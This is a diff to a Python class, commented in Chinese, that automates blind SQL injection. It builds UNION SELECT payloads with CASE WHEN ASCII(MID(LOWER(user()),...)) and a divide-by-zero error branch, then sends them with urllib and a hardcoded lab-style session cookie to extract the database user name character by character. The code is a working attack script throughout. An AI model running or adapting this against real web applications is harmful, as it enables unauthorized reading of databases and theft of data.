@@ -19,6 +19,15 @@ class getUser():
 
     #def _init_(self,url,orderBy,keyTag)
 
+
+    def UrlMerge(self,url,orderBy):
+
+        for i in range(1, int(orderBy) + 1):  #增加orderby字段
+            self.orderByStr += str(i) + ","
+
+        self.orderByStr = self.orderByStr[:-1] #去除最后一个字节
+
+
     def getUserBybs4(self, url, orderBy, keyTag, keyTagLen, Cookie=False):
 
         for i in range(1, int(orderBy) + 1):  #增加orderby字段
@@ -33,14 +42,11 @@ class getUser():
                 self.url = "+union+select+" + self.orderByStr + "+from+information_schema.schemata+where+case+when+ASCII(MID(LOWER(user())," + str(
                     position) + ",1))=ASCII(%22" + i + "%22)+then+1+else+2/0+end+%23"
 
-                # 2/0可以被0或者x/0代替
-                # dataBaseName只要是存在的数据库都行
-
                 # print("%s"%(url+self.url))
 
                 req = urllib.request.Request(url + self.url)
 
-                req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0')
+               # req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0')
 
                 if(Cookie!=False):
                     req.add_header('Cookie', 'security_level=0; PHPSESSID=ug6rqbmjkr62f1nv9jmndr5r84')
@@ -63,14 +69,12 @@ class getUser():
 
         print("".join(str(i) for i in self.userStr))  # 输出当前内容
 
-
-
     def getUserT1(self, url, orderBy, keyTag, keyTagLen, Cookie=False):
         for i in range(1, int(orderBy) + 1):  # 增加orderby字段
             self.orderByStr += str(i) + ","
 
         self.orderByStr = self.orderByStr[:-1]  # 去除最后一个字节
-        self.url = "+union+select+" + self.orderByStr + "+from+information_schema.schemata+where+case+when+ASCII(MID(LOWER(user()),1,1))=ASCII(%22r%22)+then+1+else+2/0+end+%23"
+        self.url = "+union+select+" + self.orderByStr + "+from+information_schema.schemata+where+case+when+ASCII(MID(LOWER(user()),1,1))=ASCII(%22x%22)+then+1+else+2/0+end+%23"
 
         # 2/0可以被0或者x/0代替
         # dataBaseName只要是存在的数据库都行
@@ -108,6 +112,7 @@ class getUser():
 
         #print("".join(str(i) for i in self.userStr))  # 输出当前内容
         #cProfile.run('your_method()')
+
 
 
 if __name__ == "__main__":
